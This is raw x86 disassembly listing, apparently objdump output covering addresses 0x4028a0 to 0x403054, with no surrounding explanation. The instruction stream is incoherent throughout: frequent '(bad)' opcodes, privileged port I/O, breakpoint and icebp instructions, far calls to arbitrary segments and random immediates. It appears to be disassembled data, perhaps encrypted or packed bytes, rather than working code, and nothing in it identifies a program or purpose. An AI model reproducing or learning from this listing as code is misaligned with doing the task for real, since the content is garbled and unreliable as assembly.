  4028a0:	imul   eax,DWORD PTR [edi],0xd6bf4124
  4028a6:	and    al,0xff
  4028a8:	mov    dl,0xc3
  4028aa:	in     eax,dx
  4028ab:	loopne 0x402856
  4028ad:	int3   
  4028ae:	sahf   
  4028af:	mov    bl,0xb4
  4028b1:	int    0x63
  4028b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028b4:	(bad)  
  4028b6:	mov    WORD PTR [ebx],ss
  4028b8:	adc    DWORD PTR [eax-0x44],esi
  4028bb:	iret   
  4028bc:	test   esi,esp
  4028be:	add    eax,0x1b140459
  4028c3:	or     DWORD PTR [ebp+0x5e],ecx
  4028c6:	js     0x402903
  4028c8:	stos   BYTE PTR es:[edi],al
  4028c9:	push   ecx
  4028ca:	adc    BYTE PTR [ecx+0x63],cl
  4028cd:	punpckldq mm7,DWORD PTR [ebx-0x4e673ae3]
  4028d4:	call   0xd7ff2e5e
  4028d9:	mov    ch,bh
  4028db:	and    esp,DWORD PTR [ebx+0x6fd9522d]
  4028e1:	mov    bl,dh
  4028e3:	pop    esp
  4028e4:	inc    edx
  4028e5:	in     eax,0xda
  4028e7:	retf   
  4028e8:	sub    bl,BYTE PTR [esp+edx*1+0x6a5bac75]
  4028ef:	push   0x22
  4028f1:	into   
  4028f2:	ror    BYTE PTR [edx-0x636fd410],1
  4028f8:	mov    esp,0x75b6e0f1
  4028fd:	ds lock pop edx
  402900:	call   0x54b84b5d
  402905:	jmp    0x4028f1
  402907:	xor    al,0x26
  402909:	lahf   
  40290a:	pushf  
  40290b:	xor    al,0x4c
  40290d:	push   ebp
  40290e:	and    DWORD PTR [ecx],eax
  402910:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402912:	sbb    al,0xbb
  402914:	push   ebp
  402915:	(bad)  
  402918:	xchg   ebx,eax
  402919:	sub    edi,DWORD PTR [ebx-0x46c54cfd]
  40291f:	dec    edi
  402920:	jl     0x4028ff
  402922:	jno    0x40297b
  402924:	nop
  402925:	xor    ebp,DWORD PTR [edi]
  402927:	adc    bh,dh
  402929:	sub    al,0xec
  40292b:	xchg   esi,eax
  40292c:	dec    ebp
  40292d:	xor    eax,0x31fb33f9
  402932:	stc    
  402933:	sub    BYTE PTR [ebx-0x652e0095],dh
  402939:	dec    esp
  40293a:	xor    al,0xe8
  40293c:	inc    ecx
  40293d:	pushf  
  40293e:	sub    BYTE PTR [esi+edx*4+0x76],ch
  402942:	cmp    DWORD PTR [ecx+0x5f],edx
  402945:	add    al,0xb6
  402947:	fwait
  402948:	ja     0x402921
  40294a:	mov    ds:0x7a37b76a,eax
  40294f:	and    BYTE PTR ds:0xab798789,bl
  402955:	push   ebx
  402956:	xlat   BYTE PTR ds:[ebx]
  402957:	scas   eax,DWORD PTR es:[edi]
  402958:	jg     0x402921
  40295a:	pop    edi
  40295b:	es and ah,ch
  40295e:	mov    cs,ebx
  402960:	push   esi
  402961:	ret    0xbbb3
  402964:	ror    BYTE PTR [esi-0x1c],0x10
  402968:	aaa    
  402969:	or     eax,0x265e0c08
  40296e:	cs icebp 
  402970:	aad    0x33
  402972:	dec    eax
  402973:	rcl    cl,cl
  402975:	cmp    eax,0x92e80bb0
  40297a:	fidiv  DWORD PTR [eax+0x72455826]
  402980:	and    esi,ebx
  402982:	mov    ch,0x2c
  402984:	(bad)  
  402985:	maskmovq mm6,mm7
  402988:	mov    eax,ds:0x2c97f3ca
  40298d:	push   edx
  40298e:	ds ret 0xb848
  402992:	test   BYTE PTR [esi-0x2b],cl
  402995:	bound  eax,QWORD PTR [eax-0x33]
  402998:	sar    edi,cl
  40299a:	pop    es
  40299b:	call   0xba86:0x5996f0be
  4029a2:	out    0x5a,al
  4029a4:	fs sbb al,0xd
  4029a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029a8:	mov    dh,0xa
  4029aa:	push   ecx
  4029ab:	sbb    eax,0x81923729
  4029b0:	or     DWORD PTR [edi],edi
  4029b2:	scas   eax,DWORD PTR es:[edi]
  4029b3:	js     0x4029ef
  4029b5:	push   ebx
  4029b6:	inc    ecx
  4029b7:	push   0x3eeb9f5d
  4029bc:	pop    es
  4029bd:	jmp    0x281c:0x2cfb032a
  4029c4:	fcmovb st,st(0)
  4029c6:	call   0x2fc6:0xddf8ddfa
  4029cd:	dec    eax
  4029ce:	xor    ebx,DWORD PTR [ecx+0x6c]
  4029d1:	add    eax,0x4bd06cb4
  4029d6:	add    eax,0x7334975b
  4029db:	mov    ebx,0x271de0e2
  4029e0:	stos   BYTE PTR es:[edi],al
  4029e1:	test   ah,al
  4029e3:	jle    0x402970
  4029e5:	cs xchg esi,eax
  4029e7:	push   esp
  4029e8:	dec    DWORD PTR [ebx+edx*4-0x6d]
  4029ec:	jbe    0x402972
  4029ee:	sub    al,0x5b
  4029f0:	inc    ecx
  4029f1:	es dec ebp
  4029f3:	test   DWORD PTR [edi+edx*1],eax
  4029f6:	mov    esi,0x18344d94
  4029fb:	dec    eax
  4029fc:	xor    eax,edx
  4029fe:	and    al,0x61
  402a00:	inc    ebx
  402a01:	fld    DWORD PTR [ebx+0x5406b88c]
  402a07:	jg     0x4029b9
  402a09:	cmp    BYTE PTR [ebp-0x22],0x66
  402a0d:	or     ecx,DWORD PTR [edi]
  402a0f:	inc    eax
  402a10:	jbe    0x402a89
  402a12:	sbb    BYTE PTR [ebp-0x5a],ch
  402a15:	fwait
  402a16:	dec    ecx
  402a17:	je     0x4029f6
  402a19:	outs   dx,BYTE PTR ds:[esi]
  402a1a:	fild   DWORD PTR [esi+0x70]
  402a1d:	dec    eax
  402a1e:	ins    DWORD PTR es:[edi],dx
  402a1f:	adc    ecx,ebp
  402a21:	and    bh,cl
  402a23:	sar    DWORD PTR [esi+0x0],0x75
  402a27:	dec    ebx
  402a28:	jo     0x402a04
  402a2a:	leave  
  402a2b:	push   cs
  402a2c:	jp     0x4029d8
  402a2e:	pop    DWORD PTR [ecx-0x75]
  402a31:	std    
  402a32:	adc    edx,DWORD PTR [esi+0x518a763b]
  402a38:	enter  0x96f6,0x54
  402a3c:	rcl    BYTE PTR [eax+0x6ad86ff7],0xda
  402a43:	lock mov edi,DWORD PTR [eax+0x6fd3af90]
  402a4a:	push   ds
  402a4b:	pop    ecx
  402a4c:	mul    DWORD PTR [ebp+0xef4cb26]
  402a52:	push   ebp
  402a53:	push   ebp
  402a54:	aad    0xec
  402a56:	xor    eax,0x13e9c372
  402a5b:	test   eax,0x2c2d96f7
  402a60:	mov    cl,0x52
  402a62:	pop    edx
  402a63:	mov    edx,0xf117b50d
  402a68:	test   eax,0x6ad569db
  402a6d:	lods   al,BYTE PTR ds:[esi]
  402a6e:	aas    
  402a6f:	pop    esi
  402a70:	les    ebx,FWORD PTR [ebx]
  402a72:	mov    eax,0xaef9798d
  402a77:	(bad)  
  402a78:	dec    ebx
  402a79:	fcomp  QWORD PTR [ebp+ebx*2+0x131c6608]
  402a80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a81:	pop    ebx
  402a82:	ds pop ss
  402a84:	lock mov ebx,0xd63c76f
  402a8a:	outs   dx,BYTE PTR ds:[esi]
  402a8b:	xor    ch,al
  402a8d:	hlt    
  402a8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a90:	lods   al,BYTE PTR ds:[esi]
  402a91:	push   0xc50c2a2d
  402a96:	shr    DWORD PTR ds:0xa8c0f9e1,1
  402a9c:	add    al,0xfc
  402a9e:	jmp    0xb7f08a6f
  402aa3:	jle    0x402a2b
  402aa5:	outs   dx,DWORD PTR ds:[esi]
  402aa6:	aad    0x6c
  402aa8:	mov    eax,0x7501d4e2
  402aad:	xchg   dx,ax
  402aaf:	(bad)  
  402ab0:	call   0xe4eb:0x1d8f47ab
  402ab7:	test   eax,0x4fa8d3e2
  402abc:	into   
  402abd:	sub    eax,0x246944e3
  402ac2:	shr    WORD PTR [ecx],1
  402ac5:	mov    esp,0x903b0309
  402aca:	xchg   DWORD PTR [ebp+0x50],ebp
  402acd:	daa    
  402ace:	xchg   ecx,eax
  402acf:	cmp    eax,0x7cb6124b
  402ad4:	sub    edi,ebp
  402ad6:	mov    ah,0x54
  402ad8:	aas    
  402ad9:	test   al,0x87
  402adb:	out    dx,al
  402adc:	jle    0x402a65
  402ade:	mov    dl,0xe5
  402ae0:	(bad)  
  402ae1:	sub    al,0x28
  402ae3:	pop    edi
  402ae4:	arpl   WORD PTR [ecx],si
  402ae6:	repnz sbb eax,0x2769d5e6
  402aec:	addr16 std 
  402aee:	sub    BYTE PTR [ebp+esi*1+0x53fd53f7],bl
  402af5:	pop    esp
  402af6:	lahf   
  402af7:	adc    eax,0x6bd4a3f1
  402afc:	aam    0x3e
  402afe:	fdiv   DWORD PTR [eax+0xe]
  402b01:	cwde   
  402b02:	test   eax,0x483e4694
  402b07:	cmp    eax,0x1cb1343a
  402b0c:	test   BYTE PTR [ebp+0x5860480a],dl
  402b12:	and    edx,esi
  402b14:	mov    esp,ss
  402b16:	scas   al,BYTE PTR es:[edi]
  402b17:	les    eax,FWORD PTR ds:0x22f3881c
  402b1d:	jecxz  0x402b18
  402b1f:	pop    esi
  402b20:	adc    al,0xf7
  402b22:	sub    DWORD PTR [edi],edi
  402b24:	or     al,0xcd
  402b26:	in     eax,dx
  402b27:	dec    ecx
  402b28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b29:	mov    eax,ds:0xcd170f1
  402b2e:	add    BYTE PTR [ebx+0x436cf962],cl
  402b34:	aam    0xa3
  402b36:	mov    bh,0x2
  402b38:	mov    BYTE PTR [eax],ah
  402b3a:	aas    
  402b3b:	inc    esp
  402b3c:	push   edi
  402b3d:	sub    ecx,DWORD PTR [edx+eax*8-0x1634ef4e]
  402b44:	mov    BYTE PTR [ecx],al
  402b46:	loop   0x402b4d
  402b48:	aaa    
  402b49:	pop    esi
  402b4a:	out    0x18,eax
  402b4c:	aaa    
  402b4d:	fidivr WORD PTR [edx+0x1a93946f]
  402b53:	dec    ebx
  402b54:	fstp   TBYTE PTR [ebx+0x4d]
  402b57:	mov    bh,0xfd
  402b59:	das    
  402b5a:	dec    esp
  402b5b:	call   0x2c10:0x498b62a5
  402b62:	dec    esi
  402b63:	push   ebx
  402b64:	add    al,0xa
  402b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b67:	inc    ebp
  402b68:	sub    eax,DWORD PTR [edi-0xd]
  402b6b:	hlt    
  402b6c:	xchg   esi,eax
  402b6d:	add    ebx,ebx
  402b6f:	pop    ecx
  402b70:	popf   
  402b71:	mov    DWORD PTR [edi+0x4],eax
  402b74:	fadd   DWORD PTR [eax+0x1bb47f65]
  402b7a:	pop    ecx
  402b7b:	adc    dh,BYTE PTR [ebx+edi*8]
  402b7e:	xor    al,0x55
  402b80:	jnp    0x402bbd
  402b82:	shl    al,cl
  402b84:	cmc    
  402b85:	lea    esp,[edi-0x315d62a0]
  402b8b:	add    DWORD PTR [eax+ecx*2+0x24],eax
  402b8f:	scas   eax,DWORD PTR es:[edi]
  402b90:	bound  esi,QWORD PTR [ebp+0x5d5b5ea3]
  402b96:	pop    ebp
  402b97:	xchg   BYTE PTR [esi+0x717e420f],dl
  402b9d:	pop    ecx
  402b9e:	mov    WORD PTR [esi+ebx*2],ds
  402ba1:	pop    esp
  402ba2:	mov    esp,0x7c6cc4bc
  402ba7:	push   edx
  402ba8:	shr    DWORD PTR [eax],cl
  402baa:	and    BYTE PTR [edi+0x6e],ch
  402bad:	mov    ch,0x95
  402baf:	int    0x4c
  402bb1:	pop    ecx
  402bb2:	pop    eax
  402bb3:	leave  
  402bb4:	cmp    al,BYTE PTR [ebx-0x23b0827f]
  402bba:	push   ebx
  402bbb:	icebp  
  402bbc:	add    ebp,DWORD PTR ds:0xed7f1aa4
  402bc2:	mov    cl,0x8f
  402bc4:	fadd   QWORD PTR [eax]
  402bc6:	iret   
  402bc7:	xor    al,0xea
  402bc9:	pusha  
  402bca:	js     0x402bdf
  402bcc:	adc    ebx,edx
  402bce:	jmp    0xbb19:0x30e050f6
  402bd5:	lahf   
  402bd6:	ds loopne 0x402c3d
  402bd9:	pop    esp
  402bda:	pop    eax
  402bdb:	ss ds dec eax
  402bde:	sub    ebp,eax
  402be0:	xchg   BYTE PTR [edx+0x10],ch
  402be3:	stc    
  402be4:	pop    esi
  402be5:	imul   ecx,ebp,0xffffffca
  402be8:	jnp    0x402b95
  402bea:	xor    al,0x24
  402bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bed:	add    ebp,DWORD PTR ss:[edi+esi*8+0x22]
  402bf2:	int3   
  402bf3:	pushf  
  402bf4:	sub    BYTE PTR [edi+0x3f],al
  402bf7:	sub    bh,ah
  402bf9:	call   DWORD PTR [ebx+0x5ebb9f29]
  402bff:	or     dh,BYTE PTR [ecx]
  402c01:	loopne 0x402c07
  402c03:	mov    al,BYTE PTR ds:0xc4f5001f
  402c09:	or     eax,0xd010be2d
  402c0e:	sbb    ch,ah
  402c10:	imul   esp,DWORD PTR ss:0xacdda878,0xa7c94dce
  402c1b:	or     DWORD PTR [edx-0x79],eax
  402c1e:	cs popa 
  402c20:	pop    es
  402c21:	add    BYTE PTR [ebp-0x2eda4390],bh
  402c27:	and    DWORD PTR [ebp-0x4e],ebp
  402c2a:	test   DWORD PTR [ebp+ebx*4-0x1a9df2d4],edi
  402c31:	and    eax,0x1fbe8cb6
  402c36:	fs mov edi,0xf29cd6bf
  402c3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402c3d:	fwait
  402c3e:	xor    esp,DWORD PTR [esi+0x18]
  402c41:	dec    edi
  402c42:	and    DWORD PTR [ecx-0x6c],edx
  402c45:	int    0xbb
  402c47:	pop    es
  402c48:	jmp    0x5323:0xbef9de3
  402c4f:	xchg   DWORD PTR [eax+0x2a0f972e],ebp
  402c55:	imul   edx,ebx,0x70c7d168
  402c5b:	mov    al,0xed
  402c5d:	dec    esp
  402c5e:	sub    edi,DWORD PTR [ebx-0x3354c728]
  402c64:	dec    ebp
  402c65:	xor    dl,dh
  402c67:	add    BYTE PTR [ebx-0x4cacb900],0x6b
  402c6e:	adc    eax,0x70e398a9
  402c73:	or     BYTE PTR [edx],bh
  402c75:	push   ebx
  402c76:	inc    esi
  402c77:	add    DWORD PTR [ebx-0x4d6f0d78],ecx
  402c7d:	and    ch,BYTE PTR [ecx-0x6e559bc2]
  402c83:	mov    ds:0x6c6adec2,eax
  402c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c89:	popf   
  402c8a:	lock enter 0x9b93,0xb
  402c8f:	das    
  402c90:	and    BYTE PTR [ecx-0x21542684],al
  402c96:	scas   al,BYTE PTR es:[edi]
  402c97:	jmp    0x402c22
  402c99:	jg     0x402d11
  402c9b:	popa   
  402c9c:	cmp    BYTE PTR [edx],0x6b
  402c9f:	(bad)  
  402ca0:	cmc    
  402ca1:	mov    BYTE PTR [eax-0x8],dl
  402ca4:	sbb    cl,cl
  402ca6:	add    al,0x85
  402ca8:	adc    eax,0x7c8a4d23
  402cad:	mov    ecx,0x77bca3b3
  402cb2:	add    BYTE PTR [ebx+ebp*2],0x13
  402cb6:	jae    0x402c92
  402cb8:	popa   
  402cb9:	xor    dl,ah
  402cbb:	and    al,BYTE PTR [eax-0x57]
  402cbe:	imul   esi,ebx,0xbc37baf4
  402cc4:	in     al,dx
  402cc5:	pop    edi
  402cc6:	or     ebp,DWORD PTR [ecx]
  402cc8:	pop    ss
  402cc9:	inc    esp
  402cca:	cld    
  402ccb:	mov    eax,ds:0xb5bdf41c
  402cd0:	cmp    esp,DWORD PTR ds:0xabe0aa2c
  402cd6:	add    BYTE PTR [ebx-0x7e3ba9d],0x14
  402cdd:	mov    ch,0xe8
  402cdf:	test   eax,0x5123969d
  402ce4:	inc    BYTE PTR [ebx]
  402ce6:	xchg   ecx,eax
  402ce7:	(bad)  
  402ce8:	lods   al,BYTE PTR ds:[esi]
  402ce9:	aas    
  402cea:	sahf   
  402ceb:	int3   
  402cec:	daa    
  402ced:	mov    esp,0x250f0c93
  402cf2:	ret    
  402cf3:	jno    0x402d5d
  402cf5:	out    0x27,eax
  402cf7:	ja     0x402cf8
  402cf9:	(bad)  
  402cfa:	std    
  402cfb:	(bad)  
  402cfc:	icebp  
  402cfd:	cmp    BYTE PTR [edi+0xd],bl
  402d00:	mov    dl,0xd3
  402d02:	xchg   ebx,eax
  402d03:	and    al,0x32
  402d05:	and    DWORD PTR [eax-0x1b],esi
  402d08:	cvtdq2ps xmm1,XMMWORD PTR [ecx]
  402d0b:	inc    ebx
  402d0c:	outs   dx,DWORD PTR ds:[esi]
  402d0d:	adc    BYTE PTR [edi],ah
  402d0f:	pop    ds
  402d10:	test   DWORD PTR [edi-0x1],esp
  402d13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d14:	lahf   
  402d15:	cdq    
  402d16:	sbb    bl,al
  402d18:	or     al,0xf7
  402d1a:	stos   BYTE PTR es:[edi],al
  402d1b:	sub    dl,ah
  402d1d:	hlt    
  402d1e:	mov    ds:0xc5ebf370,al
  402d23:	fdivr  st(7),st
  402d25:	sbb    ebp,DWORD PTR [ecx]
  402d27:	adc    edi,DWORD PTR [ecx-0x4a]
  402d2a:	pop    ebx
  402d2b:	pop    ebp
  402d2c:	pop    ss
  402d2d:	mov    BYTE PTR [eax],dh
  402d2f:	in     al,dx
  402d30:	(bad)  
  402d31:	pop    eax
  402d32:	outs   dx,BYTE PTR ds:[esi]
  402d33:	inc    esi
  402d34:	pop    ss
  402d35:	mov    bh,0x1f
  402d37:	xor    al,BYTE PTR ds:0x23f627ad
  402d3d:	mov    esi,0x5fa6d45f
  402d42:	(bad)
  402d45:	aam    0xa6
  402d47:	gs or  al,0x45
  402d4a:	shr    ebx,0xe3
  402d4d:	cmp    DWORD PTR [edi-0x3d98a5a7],ebx
  402d53:	cdq    
  402d54:	(bad)  
  402d55:	inc    sp
  402d57:	xlat   BYTE PTR ds:[ebx]
  402d58:	(bad)  
  402d5a:	mov    bh,0x81
  402d5c:	xor    dl,BYTE PTR [edx-0x6a]
  402d5f:	mov    al,0x83
  402d61:	in     eax,0x8
  402d63:	or     al,BYTE PTR [edx+0x8]
  402d66:	daa    
  402d67:	(bad)  
  402d68:	push   ss
  402d69:	jmp    0x402d3d
  402d6b:	loope  0x402d46
  402d6d:	push   eax
  402d6e:	(bad)  
  402d6f:	popa   
  402d70:	ror    edi,1
  402d72:	mov    ds:0xaebffa6f,al
  402d77:	xor    eax,0x9266055f
  402d7c:	sub    ebp,0xffffffdc
  402d7f:	jb     0x402dba
  402d81:	call   0x70c07639
  402d86:	sti    
  402d87:	or     esp,ebp
  402d89:	loopne 0x402d25
  402d8b:	inc    ecx
  402d8c:	or     al,0x46
  402d8e:	jne    0x402de1
  402d90:	xor    DWORD PTR [ebp-0x71],edx
  402d93:	ret    0xe7ed
  402d96:	xchg   edi,eax
  402d97:	push   edx
  402d98:	adc    eax,0x1de1f4f5
  402d9d:	dec    edx
  402d9e:	mov    cl,0x85
  402da0:	repnz sub eax,0x71184402
  402da6:	sbb    ch,BYTE PTR [ebx]
  402da8:	jo     0x402dd3
  402daa:	push   esp
  402dab:	xor    al,0x4f
  402dad:	jl     0x402d53
  402daf:	mov    esi,fs
  402db1:	pop    cx
  402db3:	or     DWORD PTR [ebx-0x3f],ecx
  402db6:	outs   dx,DWORD PTR ds:[esi]
  402db7:	jno    0x402d3a
  402db9:	fmul   st(5),st
  402dbb:	inc    esp
  402dbc:	ret    0xd70a
  402dbf:	cmp    al,0x8a
  402dc1:	inc    ecx
  402dc2:	cmp    BYTE PTR [esi],0x47
  402dc5:	dec    esp
  402dc6:	push   edx
  402dc7:	cli    
  402dc8:	sti    
  402dc9:	mov    esp,0xc25a1e6c
  402dce:	les    ecx,FWORD PTR [ecx-0x7fa579c7]
  402dd4:	jl     0x402dc2
  402dd6:	mov    dl,0x7
  402dd8:	jnp    0x402e1c
  402dda:	mov    ecx,0x6c8c0550
  402ddf:	or     esp,DWORD PTR [edi+ebx*8+0x7fdf6e37]
  402de6:	xor    eax,0x52d14ad3
  402deb:	fwait
  402dec:	scas   eax,DWORD PTR es:[edi]
  402ded:	addr16 adc al,dh
  402df0:	xchg   BYTE PTR [edi+ebp*8-0x7431d38e],ah
  402df7:	adc    al,0xb2
  402df9:	mov    ds:0xbb181164,eax
  402dfe:	jo     0x402da2
  402e00:	adc    dl,al
  402e02:	in     al,dx
  402e03:	mov    BYTE PTR [ebp-0xfa95369],dh
  402e09:	sbb    DWORD PTR cs:[ebx],0x61a87590
  402e10:	loope  0x402e16
  402e12:	repnz fsub QWORD PTR [esi-0x1e2e6cf2]
  402e19:	sbb    ah,bl
  402e1b:	or     BYTE PTR [ebx-0x6551ef78],0x6b
  402e22:	adc    DWORD PTR [eax-0x45],eax
  402e25:	pop    ds
  402e26:	test   bh,0xa7
  402e29:	sbb    eax,0x46ee80b0
  402e2e:	(bad)  
  402e2f:	arpl   WORD PTR ds:0x93b56b0e,si
  402e35:	fwait
  402e36:	add    al,0x59
  402e38:	rcr    DWORD PTR [esi+0x344bcf3c],1
  402e3e:	fistp  DWORD PTR [edx+0x2e]
  402e41:	dec    edx
  402e42:	pop    edi
  402e43:	or     eax,0x42b1526e
  402e48:	aad    0x28
  402e4a:	inc    ebp
  402e4b:	pop    eax
  402e4c:	mov    al,ds:0xe81a6c2d
  402e51:	push   es
  402e52:	aaa    
  402e53:	clc    
  402e54:	inc    ch
  402e56:	repnz mov ebx,0x466ebb3
  402e5c:	fld    DWORD PTR [eax+0x3de6faec]
  402e62:	outs   dx,BYTE PTR ds:[esi]
  402e63:	mov    DWORD PTR [edi],edi
  402e65:	inc    eax
  402e66:	fcmovu st,st(0)
  402e68:	add    al,0x70
  402e6a:	outs   dx,DWORD PTR ds:[esi]
  402e6b:	xor    cl,BYTE PTR [esi]
  402e6d:	not    BYTE PTR [esi+0x48]
  402e70:	arpl   WORD PTR [ecx-0x77],cx
  402e73:	adc    edx,esp
  402e75:	mov    edi,0xa85f1941
  402e7a:	mov    ch,0xc7
  402e7c:	std    
  402e7d:	iret   
  402e7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e7f:	sbb    ebx,DWORD PTR [ecx-0x10]
  402e82:	push   cs
  402e83:	icebp  
  402e84:	ret    0xd20f
  402e87:	cmp    ch,dh
  402e89:	jmp    0xfaf0:0x2904f3c8
  402e90:	push   edx
  402e91:	ror    BYTE PTR [esi-0x42fabb98],0xbc
  402e98:	push   0xffffff88
  402e9a:	fisttp QWORD PTR [ebx]
  402e9c:	mov    esp,DWORD PTR [edx+0x16]
  402e9f:	pop    ebp
  402ea0:	retf   0x7344
  402ea3:	mov    BYTE PTR [ecx],ch
  402ea5:	mov    ch,0x54
  402ea7:	fistp  QWORD PTR [edx+0x7c]
  402eaa:	les    ebx,FWORD PTR [ecx-0x5c3443ac]
  402eb0:	adc    BYTE PTR [eax+0x5a],bh
  402eb3:	add    dl,BYTE PTR [ecx]
  402eb5:	addr16 inc esp
  402eb7:	add    DWORD PTR [edx],esi
  402eb9:	call   0x1553:0xd23d5743
  402ec0:	(bad)  ds:0x9950e86e
  402ec6:	jnp    0x402f3d
  402ec8:	fwait
  402ec9:	int3   
  402eca:	call   0x4a67:0x714e7602
  402ed1:	shr    BYTE PTR [ebx+eax*1],0x57
  402ed5:	xchg   ebx,eax
  402ed6:	mov    eax,0x15689d28
  402edb:	cli    
  402edc:	mov    cs,WORD PTR [eax-0x46]
  402edf:	imul   edi,DWORD PTR [eax+0x625cded],0x0
  402ee6:	aaa    
  402ee7:	cmc    
  402ee8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee9:	jo     0x402eb8
  402eeb:	pushf  
  402eec:	pop    esi
  402eed:	push   edx
  402eee:	adc    BYTE PTR [edi+ecx*4],dl
  402ef1:	out    dx,al
  402ef2:	loop   0x402ea6
  402ef4:	(bad)  
  402ef5:	push   edi
  402ef6:	dec    DWORD PTR [ebx]
  402ef8:	stos   BYTE PTR es:[edi],al
  402ef9:	in     al,0xe0
  402efb:	mov    al,ds:0x3cf7e77
  402f00:	xor    al,0x85
  402f02:	xlat   BYTE PTR ds:[ebx]
  402f03:	jg     0x402f10
  402f05:	inc    ebx
  402f06:	(bad)  
  402f07:	cmp    ebp,DWORD PTR [ebx+0x41]
  402f0a:	jns    0x402eb0
  402f0c:	out    0x67,al
  402f0e:	ins    DWORD PTR es:[edi],dx
  402f0f:	push   ds
  402f10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f11:	or     al,0x2f
  402f13:	sbb    cl,BYTE PTR [ebx]
  402f15:	and    ebp,DWORD PTR [edx-0x5f]
  402f18:	mov    BYTE PTR [esi-0x44],bl
  402f1b:	addr16 ret 
  402f1d:	mov    ebx,0x86c58066
  402f22:	push   ebx
  402f23:	mov    ebx,0x1e7f2aa3
  402f28:	js     0x402f5f
  402f2a:	xor    DWORD PTR [edi-0xf],edi
  402f2d:	popf   
  402f2e:	(bad)  
  402f2f:	scas   al,BYTE PTR es:[edi]
  402f30:	outs   dx,BYTE PTR ds:[esi]
  402f31:	inc    esp
  402f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f33:	jle    0x402f23
  402f35:	and    DWORD PTR [ecx+0x18817943],esp
  402f3b:	pushf  
  402f3c:	aad    0x73
  402f3e:	shl    BYTE PTR [eax],1
  402f40:	pop    edx
  402f41:	mov    WORD PTR [edx],fs
  402f43:	and    BYTE PTR [edi-0x4],dh
  402f46:	bound  ecx,QWORD PTR [esi]
  402f48:	adc    al,0x94
  402f4a:	test   ebp,edi
  402f4c:	daa    
  402f4d:	sub    al,0x84
  402f4f:	bound  edx,QWORD PTR [edi-0x7320d1f0]
  402f55:	mov    eax,ds:0x2cf44c42
  402f5a:	push   ds
  402f5b:	call   0x2496:0x3c516878
  402f62:	fld    TBYTE PTR [edx-0xb3fead0]
  402f68:	jmp    0x402f4b
  402f6a:	push   es
  402f6b:	enter  0x60fc,0xe9
  402f6f:	xor    dh,ch
  402f71:	cld    
  402f72:	les    ebp,FWORD PTR [eax+edx*2+0x32457c64]
  402f79:	fild   QWORD PTR [ecx+edx*1]
  402f7c:	sub    edx,DWORD PTR [edi]
  402f7e:	fadd   DWORD PTR [edx+0x6705093]
  402f84:	mov    edx,0xc7f7c16e
  402f89:	pop    eax
  402f8a:	ss inc esp
  402f8c:	xlat   BYTE PTR ds:[ebx]
  402f8d:	and    al,BYTE PTR [edx-0x227fcd34]
  402f93:	inc    ebx
  402f94:	add    ch,cl
  402f96:	jnp    0x402f4c
  402f98:	sbb    al,0x3e
  402f9a:	jg     0x402fba
  402f9c:	pushf  
  402f9d:	pop    ss
  402f9e:	jns    0x402f5d
  402fa0:	aas    
  402fa1:	lds    ebx,FWORD PTR [edi-0x309a58aa]
  402fa7:	inc    eax
  402fa8:	leave  
  402fa9:	inc    ebx
  402faa:	hlt    
  402fab:	cmp    DWORD PTR [esp+edi*4-0x3137d23e],eax
  402fb2:	icebp  
  402fb3:	into   
  402fb4:	inc    eax
  402fb5:	out    0x3c,al
  402fb7:	push   0x6d
  402fb9:	dec    esp
  402fba:	dec    ebx
  402fbb:	imul   ebx,DWORD PTR [ecx+0x16],0xc3253d17
  402fc2:	cmp    esp,DWORD PTR [edx+0x2acaf50b]
  402fc8:	push   ds
  402fc9:	out    0xfb,eax
  402fcb:	pop    es
  402fcc:	mov    ecx,0x39906ff9
  402fd1:	add    al,0x9e
  402fd3:	outs   dx,BYTE PTR ds:[esi]
  402fd4:	mov    dh,0x61
  402fd6:	inc    edi
  402fd7:	mov    ebp,0xf31d0825
  402fdc:	cli    
  402fdd:	sbb    DWORD PTR [edx],esi
  402fdf:	icebp  
  402fe0:	mov    ds:0x7a091f8,eax
  402fe5:	push   ss
  402fe6:	inc    ebx
  402fe7:	dec    esi
  402fe8:	jae    0x402f91
  402fea:	aaa    
  402feb:	xlat   BYTE PTR ds:[ebx]
  402fec:	div    BYTE PTR [ebx]
  402fee:	push   0x6e3b5860
  402ff3:	or     edi,DWORD PTR [ecx-0x20421f20]
  402ff9:	mov    bh,0x3b
  402ffb:	ficomp DWORD PTR [eax-0x3981fe7a]
  403001:	or     eax,0x2a956aee
  403006:	retf   
  403007:	test   BYTE PTR [ecx-0x1b499d22],0x94
  40300e:	aaa    
  40300f:	imul   esp,DWORD PTR [ecx],0xefc50452
  403015:	add    eax,ebx
  403017:	sahf   
  403018:	mov    ebx,0xfd90a166
  40301d:	pop    es
  40301e:	jg     0x402fc8
  403020:	xchg   edx,eax
  403021:	adc    bh,BYTE PTR [ebp-0x6becd782]
  403027:	pop    ecx
  403028:	(bad)  
  403029:	xlat   BYTE PTR ds:[ebx]
  40302a:	leave  
  40302b:	iret   
  40302c:	add    bh,BYTE PTR [eax+ebp*2+0x1108275a]
  403033:	dec    ebp
  403034:	repz mov ebp,ebp
  403037:	xor    eax,DWORD PTR [esi+eiz*1]
  40303a:	call   0x761d365
  40303f:	repnz xchg esi,eax
  403041:	adc    esp,edx
  403043:	(bad)  
  403044:	xor    ebp,DWORD PTR [ecx+eiz*4+0x31801322]
  40304b:	aaa    
  40304c:	fsub   st(1),st
  40304e:	pop    edi
  40304f:	push   ebp
  403050:	xor    DWORD PTR [ebp-0x5],ecx
  403053:	xchg   esp,eax
  403054:	cmp    dl,BYTE PTR [ebp-0x6001a1bb]
